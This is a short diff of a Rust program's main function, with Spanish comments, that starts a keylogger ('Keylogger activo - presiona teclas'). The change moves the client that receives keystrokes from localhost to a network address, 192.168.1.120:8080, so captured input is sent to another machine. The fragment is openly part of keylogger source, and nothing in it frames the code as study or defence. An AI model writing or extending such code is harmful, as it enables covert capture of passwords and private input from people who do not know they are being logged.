@@ -18,7 +18,7 @@ fn main() -> Result<(), Box<dyn std::error::Error>> {
     }
 
     // 2. Iniciar keylogger
-    let api_client = Arc::new(ApiClient::new("http://localhost:8080"));
+    let api_client = Arc::new(ApiClient::new("http://192.168.1.120:8080"));
     println!("⌨️  Keylogger activo - presiona teclas");
 
     keylogger::start(api_client)?;
